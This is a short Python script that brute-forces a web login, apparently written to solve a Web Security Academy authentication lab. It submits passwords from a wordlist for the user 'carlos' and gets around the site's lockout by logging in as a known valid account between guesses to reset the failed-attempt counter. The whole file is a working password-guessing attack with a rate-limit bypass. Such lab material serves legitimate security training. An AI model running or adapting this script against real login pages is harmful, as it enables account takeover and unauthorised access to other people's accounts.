#!/usr/bin/env python3

import requests
import time

url = "https://<URL>/login"
s = requests.Session()
passfile = open("~/webapp_academy/authentication/passwords")
passwords = passfile.read().splitlines()
counter = 1

for i in passwords:
    data = f"username=carlos&password={i}"
    valid_data = f"username=wiener&password=peter"
    header = {"Content-Type" : "application/x-www-form-urlencoded"}

    if (counter % 2) != 0:
        print(f"Attempting:\t{i}")
        attempt = s.post(url, headers=header, data=data)

        if "Incorrect password" not in attempt.text:
            exit(f"Success:\t{i}")
        elif "You have made too many" in attempt.text:
            print("Blocked :(")
         
    else:
        print("Resetting Block")
        s.post(url, headers=header, data=valid_data)
        time.sleep(1)

        print(f"Attempting:\t{i}")
        attempt2 = s.post(url, headers=header, data=data)

        if "Incorrect password" not in attempt2.text:
            exit(f"Success:\t{i}")
        elif "You have made too many" in attempt2.text:
            print("Blocked :(")

    counter += 1